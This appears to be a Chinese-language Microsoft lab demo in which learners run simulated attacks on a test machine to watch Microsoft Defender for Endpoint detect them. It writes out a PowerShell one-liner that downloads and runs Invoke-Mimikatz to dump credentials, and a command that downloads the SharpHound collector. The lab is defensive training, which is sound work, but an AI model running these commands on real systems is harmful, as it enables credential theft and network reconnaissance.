# 模块 2 演示 - 使用 Microsoft Defender for Endpoint 缓解攻击

备注：能否成功完成本演示取决于是否完成[先决条件文档](00-prerequisites.md)中的所有步骤。

## 模拟攻击

在此任务中，你将运行两次模拟攻击，以探索 Microsoft Defender for Endpoint 的功能。

1. 如果尚未在浏览器中进入 Microsoft Defender XDR 门户，请转到 Microsoft Defender XDR (https://security.microsoft.com) 并以租户管理员身份登录。

你将使用 WIN1 上的 PowerShell 运行模拟攻击，以探索 Microsoft Defender for Endpoint 的功能******。

`Attack 1: Mimikatz - Credential Dumping`

1. 在 WIN1 计算机上，在搜索栏中键入“Command”，然后选择“以管理员身份运行”**********。

1. 在“管理员:**** 命令提示符”窗口中复制粘贴以下命令，然后按 Enter 键运行****。

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. 你应看到一条内容为“访问被拒绝”的消息，以及来自 `Microsoft Defender Antivirus, Windows Security Virus and threats protection` 的弹出消息，其中显示“发现威胁”****。

1. 通过键入“exit”并按 Enter 键，退出“管理员:**命令提示符”窗口**********。

`Attack 2: Bloodhound - Collection`

1. 在 WIN1 计算机上，在搜索栏中键入“PowerShell”，选择“Windows PowerShell”，然后选择“以管理员身份运行”**************。

1. 在“管理员:**** Windows PowerShell”窗口中复制并粘贴以下命令，然后按 Enter 键运行****。

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**注意：** 建议一次复制、粘贴和运行一个命令。 可以打开记事本并将命令复制到临时文件中以完成此操作**。 第一个命令在 Atomic Red Team 文件夹所在的同一文件夹中创建名为 ExternalPayloads 的文件夹****。 第二个命令从 BloodHound GitHub 存储库下载 SharpHound.ps1 文件，并将其保存在 ExternalPayloads 文件夹中******。

1. 应会看到来自 `Windows Security Virus and threats protection` 的弹出消息，其中显示“发现威胁”**。

1. 在“管理员:**** Windows PowerShell”窗口中复制并粘贴以下命令，然后按 Enter 键运行****。

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. 如果输出为“True”，则 Microsoft Defender 防病毒尚未删除恶意软件有效负载文件**。 如果输出为“False”，则 Microsoft Defender 防病毒已删除恶意软件有效负载文件**。 使用向上箭头键重复命令，直到输出为“False”**。

## 你已完成本演示
